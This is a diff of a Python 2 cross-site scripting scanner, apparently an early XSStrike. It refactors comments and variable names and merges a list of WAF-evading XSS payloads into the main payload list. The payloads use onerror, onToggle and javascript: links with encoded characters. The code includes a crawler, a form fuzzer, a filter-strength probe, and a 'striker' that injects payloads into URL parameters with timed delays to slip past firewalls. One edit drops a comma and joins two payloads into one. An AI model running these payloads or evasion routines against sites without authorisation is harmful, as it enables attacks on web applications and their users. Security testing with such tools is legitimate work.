@@ -29,8 +29,12 @@ import socket
 from colorama import init , Style, Back,Fore
 from io import open
 from itertools import izip
-type = 'xss'
-WAF = "" #This variable gets assigned True if the WAF is active otherwise False.
+
+###############################################################################
+# Declaring some variables
+###############################################################################
+type = 'xss' #Used by Ninja to get fuzz for XSS from the database
+WAF = "" #Used by WAF Detector
 br = mechanize.Browser()
 br.set_handle_robots(False) #Makes mechanize not to follow robots.txt file
 xsschecker = "d3v" #A word that is unlikely to appear on a webpage,lets Fuzzer, Ninja, Hulk know where to attack
@@ -45,6 +49,7 @@ whitelist = ['input', 'textarea'] #These tags are the top priority to break out 
 OCCURENCE_NUM = 0
 OCCURENCE_PARSED = 0
 LIST_OF_PAYLOADS = [] #A list of payloads that are marked as working by fuzzer
+
 ###################################################################
 #   Payload Section
 ###################################################################
@@ -68,18 +73,10 @@ FUZZING_PAYLOADS_ATTR = [
     "'><script>alert(1)</script>"
 ]
 
-#Some payloads which are proved to bypass WAFs
-evades = [
-"\"><imG/sRc=l oNerrOr=(prompt)() x>",
-"<deTails oNToggle=(confi\u0072m)()>",
-"<!--<img src=--><iMg sRc=x oNError=(confirm)`` x>",
-"<A/iD=x hREf=javascript&colon;(prompt)&lpar;1&rpar; id=x>Click</A>",
-"\"'><iMg sRc=x:confirm`` oNError=e\u0076al(src)>"
-]
-#Payloads that are hand crafted by me to hit most of the targets
+#Payloads for the striker
 vectors = [
-"\"><img sRc=l oNerrOr=prompt() x>",
-"<!--<img src=--><img src=x onerror=prompt`` x>",
+"\"><imG/sRc=l oNerrOr=(prompt)() x>"
+"<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>",
 "<deTails oNToggle=confi\u0072m()>",
 "<A/iD=x hREf=javascript&colon;(prompt)&lpar;1&rpar; id=x>Click</A>",
 "/\"><img sRc=l oNerrOr=prompt() x>",
@@ -144,8 +141,9 @@ def fuzzer(): #Basic structure of fuzzer
         else:
             print "\033[1;31m--------------------------------------------\033[1;m"
             striker()
-
-def scan_occurence(init_resp): #Checks "where" the input got refelectedd
+#scan_occurence() runs scan for a reflected instance (a param can be used multiple times on a page)
+def scan_occurence(init_resp):
+    #Begin parsing HTML tags to locate the position of xsschecker i.e. d3v
     location = html_parse(init_resp)
     if(location == "comment"): #If its in a comment
         print "\033[1;33m[!]\033[1;m Reflection found in an HTML comment."
@@ -429,7 +427,7 @@ def striker():
                         domain = domain0.replace("https://","").replace("http://","").replace("www.","").replace("/","")
                         paraname = [] #Parameter name
                         paravalue = [] #Parameter value
-                        lop = unicode(len(evades)) #Calculates the number of evades i.d. WAF bypass payloads
+                        lop = unicode(len(vectors)) #Calculates the number of vectors i.d. WAF bypass payloads
                         print "\033[1;97m[>]\033[1;m Payloads loaded: "+lop
                         print "\033[1;97m[>]\033[1;m Striking the paramter(s)" 
                         parameters = parse_qs(finalurl.query,keep_blank_values=True) #Parses parameters
@@ -446,14 +444,14 @@ def striker():
                         for param_name, pv in izip(paraname,paravalue): #Scanning the parameter.
                             print "\033[1;97m[>]\033[1;m Testing parameter: "+ param_name
                             fpar.append(unicode(param_name)) #Appends paramter names to fpar list
-                            for x in evades: #Takes a payload from evade list
+                            for x in vectors: #Takes a payload from evade list
                                 validate = x #declares the validate variable
                                 if validate == "": #If the payload is absent it is skipped
                                     progress = progress + 1
                                 else:
                                     time.sleep(6) #Delays the request by 6 seconds to bypass WAF
                                     progress = progress + 1 #1 payload has been injected
-                                    sys.stdout.write("\r\033[1;97m[>]\033[1;m Payloads injected: %i / %s"% (progress,len(evades)))
+                                    sys.stdout.write("\r\033[1;97m[>]\033[1;m Payloads injected: %i / %s"% (progress,len(vectors)))
                                     sys.stdout.flush()
                                     enc = quote_plus(x) #URL encodes the payload
                                     data = path+"?"+param_name+"="+pv+enc #the whole url which contains the actual url and payload
@@ -546,7 +544,7 @@ def striker():
                                 pass
                             progress = 0
                     quit()
-                except(httplib.HTTPResponse, socket.error), Exit:
+                except:
                     print "\033[1;31m[-]\033[1;m URL is offline!"
                     quit()
             except(KeyboardInterrupt), Exit:
@@ -562,7 +560,6 @@ def POST():
             domain0 = '{uri.scheme}://{uri.netloc}/'.format(uri=finalurl)
             domain = domain0.replace("https://","").replace("http://","").replace("www.","").replace("/","")
             path = urlparse(URL).scheme+"://"+urlparse(URL).netloc+urlparse(URL).path
-            url = URL
             lop = str(len(vectors))
             print "\033[1;97m[>]\033[1;m Payloads loaded: "+lop
             print "\033[1;97m[>]\033[1;m Striking the parameter(s)" 
@@ -637,45 +634,25 @@ def POST():
 #                   Spider
 ############################################################
 def initial_crawling(firstDomains):
-    url1 = urlparse(URL)
-    urldata = parse_qsl(url1.query)
-    url = u'{uri.scheme}://{uri.netloc}/'.format(uri=url1)
-    if "http://" in url:
-        url = url.replace("http://","")
-    if "https://" in url:
-        url = url.replace("https://","")
-    if "http://www." in url:
-        url = url.replace("http://www.","")
-    if "https://www." in url:
-        url = url.replace("http://www.","")
-    if "www." in url:
-        url = url.replace("www.","")
-    firstDomains = []   #list of domains
-    
-    smallurl = url  #small url is the part of url without http and www
-
-    allURLS = []
-    allURLS.append(url) #just one url at the moment
+    global URL
+    parsed_URL = urlparse(URL) #Parsing the URL
+    URL = u'{uri.scheme}://{uri.netloc}/'.format(uri=parsed_URL) #Fetching only the homepage from the supplied URL
+    firstDomains = []   #list of links found during crawling
     print "\033[1;97m[>]\033[1;m Loading spider"  #doing a short traversal if no command line argument is being passed
-    for url in allURLS:
-        x = str(url)
-        smallurl = x
-        url = "http://www." + str(url)
+    try:
+        br.open(URL) #makes a request to the homepage
+        print "\033[1;97m[>]\033[1;m Finding all the links present in the seed page " + str(URL)
         try:
-            br.open(url)
-            print "\033[1;97m[>]\033[1;m Finding all the links present in the seed page " + str(url)
-            try:
-                for link in br.links():     #finding the links of the website
-                    if smallurl in str(link.absolute_url):
-                        firstDomains.append(str(link.absolute_url))
-                firstDomains = list(set(firstDomains))
-            except:
-                pass
+            for link in br.links():     #finding the links in the homepage
+                if URL in str(link.absolute_url): #if a link is found
+                    firstDomains.append(str(link.absolute_url)) #it is added to total list list i.e. firstDomains
+            firstDomains = list(set(firstDomains))
         except:
             pass
+    except:
+       pass
     print "\033[1;33m[!]\033[1;m Number of potenial targets: " + str(len(firstDomains))
     return firstDomains
-
 
 def findxss(firstDomains):
     print "\033[1;97m[>]\033[1;m Loading fuzzing engine\n" #starting finding XSS
@@ -686,21 +663,21 @@ def findxss(firstDomains):
         for link in firstDomains:
             y = str(link)
             print str(link)
-            if 'jpg' in y:      #just a small check
+            if 'jpg' in y:  #checking if the URL is source of an image
                 print "\033[1;33m[!]\033[1;m This is just an image."
-            elif 'pdf' in y:
+            elif 'pdf' in y: #checking if the URL is source of an pdf document
                 print "\033[1;33m[!]\033[1;m This is just a document."
-            else:
+            else: #If the URL is not a image or pdf document
                 try:
                     br.open(str(link))  #open the link
-                except:
+                except: #If it fails due to some reason
                     dummyVar = 0
                 try:
-                    for form in br.forms(): #check its forms
+                    for form in br.forms(): #checking for forms in the URL
                         count = count + 1
                 except:
                     dummyVar = 0
-                if count > 0:       #if a form exists, submit it
+                if count > 0: #if a form exists, submit it
                     try:
                         params = list(br.forms())[0]    #our form
                     except:
@@ -734,7 +711,7 @@ def findxss(firstDomains):
                             except:
                                 print "\033[1;31m[-]\033[1;m Unable to read the page"
                             try:
-                                br.back()
+                                br.back() #Going back to the original page so we can try second payload
                             except:
                                 dummyVar = 0
 
@@ -745,13 +722,13 @@ def findxss(firstDomains):
                             except:
                                 dummyVar = 0
                             try:
-                                br.submit()
+                                br.submit() #submiting the form
                             except:
                                 dummyVar = 0
                             try:
-                                if '<a href="javascript:alert(1)' in br.response().read():
+                                if '<a href="javascript:alert(1)' in br.response().read(): #If the payload is found in response its vulnerable
                                     print "\nVulnerable page: " + str(link) + "\n [+] Payload Type: javascript:alert(1)" + "\n"
-                                    xssLinks.append(link)
+                                    xssLinks.append(link) #Adding link to the vulnerable links list
                                 else:
                                     dummyVar = 0
                             except:
@@ -778,18 +755,18 @@ f_popup_based = [] #error based payloads which got filtered
 fuzzed = [] #Fuzz strings
 popup = [] #Strings that raise popup e.g. alert()
 
-def bypasser(type, fuzz, url):
+def bypasser(type, fuzz, URL):
     pbar = ProgressBar(widgets=['\033[1;97m[>]\033[1;m Strings sent: ',SimpleProgress(), Bar()]) #Display progress
     result = [] #Result of fuzzing
     try:
-        low_string = url.replace("d3v", "'\"(<i=i>)\"'") #Inserting a string with all major chars
+        low_string = URL.replace("d3v", "'\"(<i=i>)\"'") #Inserting a string with all major chars
         low_request = br.open(low_string).read() #Making request to url
         low = low_request.find("'\"(<i=i>)\"'") #Checking if the string is present in response
         if low != -1: #If the string was not filtered
             print "\033[1;32m[+]\033[1;m Filter Strength : \033[1;32mLow\033[1;m"
             start_from = low - 3 #As at this position string was not filtered, we will use it as starting point for fuzzer
         else: #If string was filtered
-            medium_string = url.replace("d3v", "<xx+src%3Dxx+onxx%3Dxx>")
+            medium_string = URL.replace("d3v", "<xx+src%3Dxx+onxx%3Dxx>")
             medium_request = br.open(medium_string).read()
             medium = medium_request.find("<xx src=xx onxx=xx>")
             if medium != -1:
@@ -843,7 +820,7 @@ def extractParams(input):
     for item in input:
         param_data[item.split('=',1)[0]] = item.split('=',1)[1]
     return param_data
-def showOutput(url, result):
+def showOutput(URL, result):
     """
         :Description: This function prints the result of the bypasser() function in a nice fashion.
         :type:  Type of the fuzzing strings that were sent
@@ -920,7 +897,7 @@ def insertFuzz(URL, fuzz):
     """
     fuzz = urllib.quote_plus(fuzz) #url encoding
     randomString = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(6))
-    return randomString, url.replace('d3v', randomString + str(fuzz))
+    return randomString, URL.replace('d3v', randomString + str(fuzz))
  
 def setParams(param_data, fuzz):
     """
@@ -1024,9 +1001,8 @@ def choice(): #Activated if there is no WAF and target uses POST method
         findxss(firstDomains)
     if choice == 4:
         print "\033[1;31m--------------------------------------------\033[1;m"
-        url = URL
         fuzz = getFuzz(type) #Gets type of fuzz to be sent from the database i.e. XSS
-        bypasser(type, fuzz, url) #Launches bypasser aka Ninja
+        bypasser(type, fuzz, URL) #Launches bypasser aka Ninja
     if choice == 5:
         print "\033[1;31m--------------------------------------------\033[1;m"
         hulk()
@@ -1040,10 +1016,9 @@ def post_choice(): #Activated if the target uses POST method
     if choice == 2:
         print "\033[1;31m--------------------------------------------\033[1;m"
         global param_data
-        url = URL
         param_data = extractParams(param_data) #Sending POST data to a module which can arrange them
         fuzz = getFuzz(type) #Gets type of fuzz to be sent from the database i.e. XSS
-        bypasser(type, fuzz, url) #Launches bypasser aka Ninja
+        bypasser(type, fuzz, URL) #Launches bypasser aka Ninja
 def waf_choice():
     print "\033[97m1.\033[1;m Striker"
     print "\033[97m2.\033[1;m Ninja"
@@ -1053,9 +1028,8 @@ def waf_choice():
         striker()
     if choice == 2:
         print "\033[1;31m--------------------------------------------\033[1;m"
-        url = URL
         fuzz = getFuzz(type) #Gets the described type of fuzz i.e. XSS
-        bypasser(type, fuzz, url) #Opens bypasser
+        bypasser(type, fuzz, URL) #Opens bypasser
 
 ###########################################################################################
 #   Prints banner, help, gets input and other things a core function is supposed to do :p
